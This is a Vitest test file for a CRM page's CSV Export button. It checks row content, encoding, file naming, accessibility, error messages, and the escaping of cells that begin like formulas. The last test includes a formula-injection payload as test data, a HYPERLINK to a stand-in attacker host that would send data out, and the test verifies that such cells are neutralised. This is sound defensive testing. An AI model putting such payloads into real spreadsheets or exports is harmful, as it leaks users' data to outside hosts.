import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router-dom";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { blobBytes } from "@/test/blob";

// The Export button on the referral partners page (story CRM-S3.8a; docs/BROKER_CRM_BUILD.md D-48, D-210). The database's one call,
// export_table, is faked here (it is tested in supabase/tests/export.sql and src/lib/exportApi.test.ts): what these tests prove is what the
// page does with its answer, and what it asks. Nothing below reads the file from the page on screen.
const signOut = vi.fn();
vi.mock("@/hooks/useAuth", () => ({ useAuth: () => ({ user: { id: "u1", email: "adv@example.com" }, signOut }) }));
vi.mock("sonner", () => ({ toast: { success: vi.fn(), error: vi.fn() } }));
let firmAddress: { status: string; address?: string; name?: string } = { status: "none" };
vi.mock("@/hooks/useFirmAddress", () => ({ useFirmAddress: () => firmAddress }));
vi.mock("@/integrations/supabase/client", () => ({ supabase: {} }));
const api = {
  listMyFirms: vi.fn(),
  listReferralPartners: vi.fn(),
  loadIntakeSources: vi.fn(),
  addReferralPartner: vi.fn(),
  updateReferralPartner: vi.fn(),
};
vi.mock("@/lib/advisorApi", async () => ({ ...(await vi.importActual<object>("@/lib/advisorApi")), ...api }));
const exportTable = vi.fn();
vi.mock("@/lib/exportApi", async () => ({ ...(await vi.importActual<object>("@/lib/exportApi")), exportTable: (...args: unknown[]) => exportTable(...args) }));

const { default: AdvisorPartnersPage } = await import("./AdvisorPartnersPage");
const { DEFAULT_FIRM_ID } = await import("@/data/referralPartners");
const { ExportRefusal } = await import("@/lib/exportApi");

const DEFAULT_FIRM = DEFAULT_FIRM_ID;
const alpha = { id: DEFAULT_FIRM, name: "Alpha Advisory", address: "alpha" };
const acme = {
  firm_id: DEFAULT_FIRM, code: "acme-cfo", name: "Acme CFO Partners", kind: "accounting", created_at: "2026-11-01T00:00:00Z",
  created_by_email: "adv@example.com", updated_at: "2026-11-01T00:00:00Z", updated_by_email: "adv@example.com", version: 3,
};

// What the browser is asked to save: the blob and the name on the anchor, with the object URL's life.
let saved: { blob: Blob; name: string }[] = [];
let lastBlob: Blob | null = null;

/** The database's answer to export_table for referral partners. */
const answer = (rows: (string | number | null)[][], over: Record<string, unknown> = {}) => ({
  table: "referral_partners",
  columns: ["name", "kind", "code"],
  rows,
  rowCount: rows.length,
  wholeTable: false,
  exportedAt: "2026-03-02T12:00:00.000Z",
  ...over,
});

/** A saved file as bytes: whether it starts with the UTF-8 byte order mark, and its text (read as UTF-8, the mark kept apart). */
const fileText = async (blob: Blob) => {
  const bytes = await blobBytes(blob);
  const bom = bytes[0] === 0xef && bytes[1] === 0xbb && bytes[2] === 0xbf;
  return { bom, text: new TextDecoder("utf-8", { ignoreBOM: false }).decode(bom ? bytes.slice(3) : bytes) };
};

const renderPage = (path = "/advisor/partners") => render(<MemoryRouter initialEntries={[path]}><AdvisorPartnersPage /></MemoryRouter>);
const ready = async () => {
  renderPage();
  await screen.findByRole("row", { name: /Acme CFO Partners/ });
  return userEvent.setup();
};

describe("AdvisorPartnersPage: Export (CRM-S3.8a)", () => {
  beforeEach(() => {
    for (const fn of Object.values(api)) fn.mockReset();
    exportTable.mockReset();
    signOut.mockReset();
    saved = [];
    lastBlob = null;
    firmAddress = { status: "none" };
    api.listMyFirms.mockResolvedValue([alpha]);
    api.listReferralPartners.mockResolvedValue([acme]);
    api.loadIntakeSources.mockResolvedValue([]);
    URL.createObjectURL = vi.fn((blob: Blob) => { lastBlob = blob; return "blob:csv"; });
    URL.revokeObjectURL = vi.fn();
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function (this: HTMLAnchorElement) {
      saved.push({ blob: lastBlob as Blob, name: this.download });
    });
  });
  afterEach(() => {
    vi.useRealTimers();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  // Catches: a CSV built from the page on screen (one partner here) instead of the database's rows, so a partner past what the page shows is left out;
  // columns in another order than the page's; the header words not the page's.
  it("saves a CSV of every row the database returns, with the columns the page shows in the order it shows them", async () => {
    // None of these is the partner the page shows: the file is the database's rows.
    exportTable.mockResolvedValue(answer([
      ["Bay Law", "law_firm", "bay-law"],
      ["Cedar HR", "hr_consultant", "cedar-hr"],
      ["Zed Events", "event", "zed-events"],
    ]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));

    expect(exportTable).toHaveBeenCalledTimes(1);
    expect(exportTable).toHaveBeenCalledWith(DEFAULT_FIRM, "referral_partners", ["name", "kind", "code"], expect.objectContaining({ filters: [] }));
    // No selection is sent (choosing rows is CRM-S3.6's): an empty list would be refused (D-212), and one that is not empty would narrow the export.
    expect(exportTable.mock.calls[0][3]).not.toHaveProperty("keys");
    const file = await fileText(saved[0].blob);
    expect(file.text).toBe(
      "Partner,Kind of partner,Their code\r\n" +
      "Bay Law,Law firm,bay-law\r\n" +
      "Cedar HR,HR consultant,cedar-hr\r\n" +
      "Zed Events,Event or community,zed-events\r\n",
    );
  });

  // Catches: a file with no byte order mark, which Excel opens as Windows-1252 (so "José" and "北京" arrive as "JosÃ©" and mojibake), and a type
  // that says no character set.
  it("saves UTF-8 with a byte order mark, so a spreadsheet reads accents and other scripts as they were typed", async () => {
    exportTable.mockResolvedValue(answer([["José Müller 北京", "other", "jose"]]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));
    const file = await fileText(saved[0].blob);
    expect(file.bom).toBe(true);
    expect(file.text).toBe("Partner,Kind of partner,Their code\r\nJosé Müller 北京,Other,jose\r\n");
    expect(saved[0].blob.type).toBe("text/csv;charset=utf-8");
  });

  // Catches: a file name that says nothing of what it is or when ("export.csv", the same name on every day), a name that carries the firm's or a
  // person's name, the day counted in UTC instead of the person's own (the evening of the 1st in California is the 2nd in UTC), and the
  // database asked for day filters in another zone than the one the name's date is in.
  it("names the file for what it is and the person's own day, and says nothing of the firm or anyone in it", async () => {
    vi.spyOn(Intl.DateTimeFormat.prototype, "resolvedOptions").mockReturnValue(
      { locale: "en-US", calendar: "gregory", numberingSystem: "latn", timeZone: "America/Los_Angeles" } as Intl.ResolvedDateTimeFormatOptions,
    );
    exportTable.mockResolvedValue(answer([["Bay Law", "law_firm", "bay-law"]], { exportedAt: "2026-03-02T03:30:00.000Z" }));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));
    expect(saved[0].name).toBe("referral-partners-2026-03-01.csv");
    expect(exportTable).toHaveBeenCalledWith(DEFAULT_FIRM, "referral_partners", ["name", "kind", "code"], { filters: [], timeZone: "America/Los_Angeles" });
  });

  // Catches: the file going out as a data: link or a request to some address (the rows would leave the product's own origin and the database), an
  // object URL kept for the life of the page, and a file opened in a tab instead of saved.
  it("hands the file to the browser as a blob link that is let go afterwards, and asks nothing of anyone but the database", async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    const fetched = vi.fn();
    vi.stubGlobal("fetch", fetched);
    const open = vi.spyOn(window, "open").mockReturnValue(null);
    exportTable.mockResolvedValue(answer([["Bay Law", "law_firm", "bay-law"]]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));

    expect(URL.createObjectURL).toHaveBeenCalledTimes(1);
    expect(URL.revokeObjectURL).not.toHaveBeenCalled();
    await vi.advanceTimersByTimeAsync(60_000);
    expect(URL.revokeObjectURL).toHaveBeenCalledWith("blob:csv");
    expect(fetched).not.toHaveBeenCalled();
    expect(open).not.toHaveBeenCalled();
    expect(document.querySelectorAll("a[download]")).toHaveLength(0);
  });

  // Catches: a button over nothing (an export of no rows that the database still records), or one that waits on a list that never came.
  it("is not offered while the partners load, when they could not be loaded, or when there are none", async () => {
    let arrive: (v: unknown) => void = () => undefined;
    api.listReferralPartners.mockReturnValueOnce(new Promise((resolve) => { arrive = resolve; }));
    const loading = renderPage();
    await screen.findByRole("status");
    expect(screen.queryByRole("button", { name: /Export/ })).not.toBeInTheDocument();
    arrive([]);
    await screen.findByText("No referral partners yet.");
    expect(screen.queryByRole("button", { name: /Export/ })).not.toBeInTheDocument();
    loading.unmount();

    api.listReferralPartners.mockRejectedValue(new Error("boom"));
    renderPage();
    await screen.findByText("We couldn't load the referral partners.");
    expect(screen.queryByRole("button", { name: /Export/ })).not.toBeInTheDocument();
    expect(exportTable).not.toHaveBeenCalled();
  });

  // Catches: a file of a header and nothing else saved, and "Exported 0 referral partners." said as though something had been taken.
  it("saves no file and says so when the database holds nothing to export", async () => {
    exportTable.mockResolvedValue(answer([]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("No referral partners to export."));
    expect(saved).toHaveLength(0);
    expect(URL.createObjectURL).not.toHaveBeenCalled();
    expect(screen.getByRole("button", { name: "Export" })).toHaveFocus();
  });

  // Catches: no sign that it is working (a second press, a second recorded export), a button taken out of the tab order so focus is lost, a count
  // worded from the rows the page holds instead of the database's own count of what it recorded (the fake's rows are fewer on purpose), a message in
  // a toast as well as the status (read twice), the answer put in a new status instead of the one the person was told "Preparing" in, and an empty
  // live region left on the page before anything has been pressed.
  it("says it is exporting, takes no second press, then says once how many the database counted, and focus never leaves the button", async () => {
    let arrive: (v: unknown) => void = () => undefined;
    exportTable.mockReturnValue(new Promise((resolve) => { arrive = resolve; }));
    const user = await ready();
    const button = screen.getByRole("button", { name: "Export" });
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    await user.click(button);

    const busy = screen.getByRole("button", { name: "Exporting…" });
    expect(busy).toBe(button);
    expect(busy).toHaveAttribute("aria-disabled", "true");
    expect(busy).toHaveFocus();
    const status = screen.getByRole("status");
    expect(status).toHaveTextContent("Preparing the export…");
    await user.click(busy);
    await user.keyboard("{Enter}");
    expect(exportTable).toHaveBeenCalledTimes(1);

    arrive(answer([["Bay Law", "law_firm", "bay-law"], ["Zed Events", "event", "zed-events"]], { rowCount: 12 }));
    await waitFor(() => expect(status).toHaveTextContent("Exported 12 referral partners."));
    expect(screen.getByRole("button", { name: "Export" })).toBe(button);
    expect(button).not.toHaveAttribute("aria-disabled");
    expect(button).toHaveFocus();
    expect(screen.getAllByText("Exported 12 referral partners.")).toHaveLength(1);
    expect(saved).toHaveLength(1);
    const { toast } = await import("sonner");
    expect(toast.success).not.toHaveBeenCalled();
  });

  // Catches: "1 referral partners".
  it("says a single partner in the singular", async () => {
    exportTable.mockResolvedValue(answer([["Bay Law", "law_firm", "bay-law"]]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Exported 1 referral partner."));
  });

  // Catches: the button shown during Nevermore support (a file of the firm's rows built in the browser leaves the product unrecorded to anyone but the
  // database, D-123, D-128), or hidden with no word of why; and a member's own role (owner, lead, agent) hiding it.
  it("is not offered during Nevermore support, which says so in one plain line, and is offered to every member who is not on one", async () => {
    const workspace = (isSupport: boolean, role: "Owner" | "Lead" | "Agent" | "Nevermore support") => ({
      firm: { id: DEFAULT_FIRM, name: "Alpha Advisory", address: "alpha" }, role, isOwner: role === "Owner", isSupport, supportEndsAt: null,
      supportSessionId: null, isPlatformAdmin: false, person: "adv@example.com",
    });
    const { WorkspaceContext } = await import("@/components/workspace/workspaceContext");
    const { DOWNLOADS_OFF_LINE } = await import("@/components/workspace/downloadsOff");
    const view = (value: ReturnType<typeof workspace>) =>
      <WorkspaceContext.Provider value={value}><MemoryRouter><AdvisorPartnersPage /></MemoryRouter></WorkspaceContext.Provider>;

    const support = render(view(workspace(true, "Nevermore support")));
    await screen.findByRole("row", { name: /Acme CFO Partners/ });
    expect(screen.queryByRole("button", { name: /Export/ })).not.toBeInTheDocument();
    expect(screen.getByText(DOWNLOADS_OFF_LINE)).toBeInTheDocument();
    support.unmount();

    for (const role of ["Owner", "Lead", "Agent"] as const) {
      const member = render(view(workspace(false, role)));
      await screen.findByRole("row", { name: /Acme CFO Partners/ });
      expect(screen.getByRole("button", { name: "Export" })).toBeInTheDocument();
      expect(screen.queryByText(DOWNLOADS_OFF_LINE)).not.toBeInTheDocument();
      member.unmount();
    }
    expect(exportTable).not.toHaveBeenCalled();
  });

  describe("when the export is refused or fails", () => {
    const refuse = (message: string, reason: ConstructorParameters<typeof ExportRefusal>[1], unauthenticated = false) =>
      exportTable.mockRejectedValue(new ExportRefusal(message, reason, unauthenticated));
    const press = async () => {
      const user = await ready();
      await user.click(screen.getByRole("button", { name: "Export" }));
      return user;
    };
    // Whatever went wrong, the page is as it was: its rows, its list not loaded again, no file, nothing left saying it is working, focus on Export.
    const pageAsItWas = () => {
      expect(screen.getByRole("row", { name: /Acme CFO Partners/ })).toBeInTheDocument();
      expect(api.listReferralPartners).toHaveBeenCalledTimes(1);
      expect(saved).toHaveLength(0);
      expect(screen.getByRole("status")).toHaveTextContent("");
      expect(screen.getByRole("button", { name: "Export" })).not.toHaveAttribute("aria-disabled");
      expect(screen.getByRole("button", { name: "Export" })).toHaveFocus();
    };

    // Catches: the 12-hour rule shown as a failure with nothing to do about it; a "Sign in again" that does not end the session (the person signs in
    // to the same stale token); the page changing, so what they were doing is lost.
    it("a whole-table export that needs a recent sign-in says so and offers Sign in again, which ends the session so the sign-in page takes them back", async () => {
      refuse("Sign in again to export the whole table: you last signed in more than 12 hours ago.", "sign_in_again");
      const user = await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("Sign in again to export the whole table: you last signed in more than 12 hours ago.");
      expect(signOut).not.toHaveBeenCalled();
      pageAsItWas();

      await user.click(within(alert).getByRole("button", { name: "Sign in again" }));
      expect(signOut).toHaveBeenCalledTimes(1);
      expect(signOut).toHaveBeenCalledWith("expired");
    });

    // Catches: the database's own sentence ("permission denied for function export_table") reaching the person; a refusal with nothing to do next.
    it("a refusal of the person's role is said in the words of a lost access, never the database's own", async () => {
      refuse("permission denied for function export_table", "forbidden");
      await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("You no longer have access to this firm's records.");
      expect(alert).toHaveTextContent("If you should still have it, ask an administrator to grant it again.");
      expect(alert).not.toHaveTextContent("permission denied");
      expect(within(alert).queryByRole("button")).not.toBeInTheDocument();
      pageAsItWas();
    });

    // Catches: an export over the cap or a filter the database won't take reading as a generic failure that "Try again" can never fix; the
    // database's sentence (which says how many rows, and what to do) not shown, as D-210 says it should be.
    it("shows the database's own sentence when the export holds too many rows or asks for something it won't take", async () => {
      // The database's sentence as D-211 words it (no exact count: it stops counting at the cap), shown as it comes and never built from a number.
      const overTheCap = "This export would hold more than 10000 rows, the most one export holds. Narrow it with a filter.";
      refuse(overTheCap, "too_many");
      const user = await press();
      expect(await screen.findByRole("alert")).toHaveTextContent(overTheCap);
      pageAsItWas();

      refuse("The table \"referral_partners\" has no column \"nickname\" to export", "invalid");
      await user.click(screen.getByRole("button", { name: "Export" }));
      await waitFor(() => expect(screen.getByRole("alert")).toHaveTextContent("The table \"referral_partners\" has no column \"nickname\" to export"));
      expect(screen.getAllByRole("alert")).toHaveLength(1);
      pageAsItWas();
    });

    // Catches: a dropped connection or a server error shown as the client's own text ("TypeError: Failed to fetch"); no way to try again; "Try again"
    // that leaves focus nowhere or exports twice; the person's page reloaded by a failure.
    it("a failure that is not a refusal says it was probably the connection, and Try again exports once more, with focus on Export", async () => {
      refuse("Couldn't export. Try again.", "failed");
      const user = await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("We couldn't export the referral partners.");
      expect(alert).toHaveTextContent("This is usually a dropped connection or a problem on our side, not something you did.");
      pageAsItWas();

      exportTable.mockResolvedValue(answer([["Bay Law", "law_firm", "bay-law"]]));
      await user.click(within(alert).getByRole("button", { name: "Try again" }));
      await waitFor(() => expect(saved).toHaveLength(1));
      expect(exportTable).toHaveBeenCalledTimes(2);
      expect(screen.queryByRole("alert")).not.toBeInTheDocument();
      expect(screen.getByRole("status")).toHaveTextContent("Exported 1 referral partner.");
      expect(screen.getByRole("button", { name: "Export" })).toHaveFocus();
    });

    // Catches: a bug in the page's own code (a TypeError) shown to the person as it was written.
    it("shows nothing of an error that is not a refusal at all", async () => {
      exportTable.mockRejectedValue(new TypeError("Cannot read properties of undefined (reading 'columns')"));
      await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("We couldn't export the referral partners.");
      expect(alert).not.toHaveTextContent("Cannot read properties");
      expect(within(alert).getByRole("button", { name: "Try again" })).toBeInTheDocument();
      pageAsItWas();
    });

    // Catches: an ended session left on the page as a failure with "Try again", which can never work; the person not taken to sign in.
    it("an ended session says so and signs the person out, so the sign-in page takes them back", async () => {
      refuse("Your session has expired. Sign in again to continue.", "failed", true);
      await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("Your session has expired.");
      expect(alert).toHaveTextContent("Taking you to sign in again…");
      expect(within(alert).queryByRole("button")).not.toBeInTheDocument();
      await waitFor(() => expect(signOut).toHaveBeenCalledWith("expired"));
      expect(signOut).toHaveBeenCalledTimes(1);
    });

    // Catches: a Nevermore support session's refusal (which the hidden button should have made impossible) shown as a failure to retry.
    it("says plainly that support can look and not export, should the database ever say so", async () => {
      refuse("Nevermore support can look, not export.", "support");
      await press();
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent("Nevermore support can look, not export.");
      expect(within(alert).queryByRole("button")).not.toBeInTheDocument();
    });
  });

  // Catches: a name with a comma splitting into two cells, a quote left single so the cell ends early, a line break in a name starting a new row
  // (each shifts every later cell in a spreadsheet), and a kind's own comma ("Accountant, CPA or fractional CFO") breaking its row.
  it("quotes a cell that holds a comma, a double quote or a line break, and doubles the quotes (RFC 4180)", async () => {
    exportTable.mockResolvedValue(answer([
      ["Smith, Jones & Co", "accounting", "smith-jones"],
      ["The \"Quote\" Club", "event", "quote-club"],
      ["Line one\nLine two", "other", "line-lf"],
      ["Carriage\rReturn", "other", "line-cr"],
      ["José Müller 北京", "other", "jose"],
    ]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));
    const file = await fileText(saved[0].blob);
    expect(file.text).toBe(
      "Partner,Kind of partner,Their code\r\n" +
      "\"Smith, Jones & Co\",\"Accountant, CPA or fractional CFO\",smith-jones\r\n" +
      "\"The \"\"Quote\"\" Club\",Event or community,quote-club\r\n" +
      "\"Line one\nLine two\",Other,line-lf\r\n" +
      "\"Carriage\rReturn\",Other,line-cr\r\n" +
      "José Müller 北京,Other,jose\r\n",
    );
  });

  // Catches: a partner named for a formula running when the file is opened in a spreadsheet (a link that sends the firm's data elsewhere, a
  // command). Each character that can start a formula, and the line break and tab a spreadsheet may skip before one, is held back by a
  // leading apostrophe; a name that only contains one of them is left alone.
  it("makes a cell that starts like a formula plain text, with a leading apostrophe, and leaves every other cell as it is", async () => {
    exportTable.mockResolvedValue(answer([
      ["=HYPERLINK(\"http://evil.example/?d=1\",\"Click\")", "other", "a"],
      ["+1+1", "other", "b"],
      ["-2+3", "other", "c"],
      ["@SUM(A1:A9)", "other", "d"],
      ["\t=1+1", "other", "e"],
      ["\r=1+1", "other", "f"],
      ["\n=1+1", "other", "g"],
      ["  =1+1", "other", "h"],
      ["A-B Partners", "other", "i"],
      ["Bay=Law", "other", "j"],
      ["Smith @ Co", "other", "k"],
      ["5 Star", "other", "l"],
      ["O'Brien", "other", "m"],
    ]));
    const user = await ready();
    await user.click(screen.getByRole("button", { name: "Export" }));
    await waitFor(() => expect(saved).toHaveLength(1));
    const file = await fileText(saved[0].blob);
    expect(file.text).toBe(
      "Partner,Kind of partner,Their code\r\n" +
      "\"'=HYPERLINK(\"\"http://evil.example/?d=1\"\",\"\"Click\"\")\",Other,a\r\n" +
      "'+1+1,Other,b\r\n" +
      "'-2+3,Other,c\r\n" +
      "'@SUM(A1:A9),Other,d\r\n" +
      "'\t=1+1,Other,e\r\n" +
      "\"'\r=1+1\",Other,f\r\n" +
      "\"'\n=1+1\",Other,g\r\n" +
      "'  =1+1,Other,h\r\n" +
      "A-B Partners,Other,i\r\n" +
      "Bay=Law,Other,j\r\n" +
      "Smith @ Co,Other,k\r\n" +
      "5 Star,Other,l\r\n" +
      "O'Brien,Other,m\r\n",
    );
  });
});
